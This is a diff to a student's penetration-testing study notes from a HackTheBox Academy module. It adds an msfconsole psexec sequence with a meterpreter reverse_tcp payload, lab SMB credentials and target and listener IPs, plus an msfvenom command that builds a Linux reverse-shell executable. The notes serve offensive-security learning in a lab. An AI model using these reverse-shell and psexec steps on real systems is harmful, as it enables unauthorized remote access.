@@ -362,9 +362,37 @@ HackTheBox pitch of this section.
 
     Not all payloads are one-liners and deployed manually like those we studied in this section. Some are generated using automated attack frameworks and deployed as a pre-packaged/automated attack to obtain a shell. Like in the very powerful Metasploit-framework, which we will work with in the next section.
 
-### Metasploit
+### Metasploit [A very useful tool, and fun to use :)))]
 
+Basic msfconsole line for windows ad system (Really basic one, not gonna work in most machine)
 
+    use windows/smb/psexec
+    set payload windows/meterpreter/reverse_tcp
+    set RHOSTS 10.129.180.71
+    set SHARE ADMIN$  #This is important thing, you can obtain list of share using Smbmap
+    set SMBPass HTB_@cademy_stdnt!  #Of course it only work with viable credential
+    set SMBUser htb-student
+    set LHOST 10.10.14.222
+
+    exploit
+
+One thing to note, if you using some payload with meterpreter like `windows/meterpreter/reverse_tcp`. This mean you will access the thing called meterpreter environment. This mean the exploit complete and successful, however you can't run command yet.
+
+However you can run some thing like `help` to display options
+
+`getuid`: it will display something like `Server username: NT AUTHORITY\SYSTEM`
+
+`shell`: to access reverse shell you're waiting
+
+### Msfvenom [Still metasploit]
+
+`msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf`: Build an executable elf file in Linux for Reverse TCP
+
+We can list all module by: `msfvenom --list payload` #This command will list about thousand lines of output, recommend write to a file. It come with detail description too 
+
+### Windows vulnerability table
+
+https://www.cvedetails.com/vendor/26/Microsoft.html
 
 # Priviledge Escalation
 
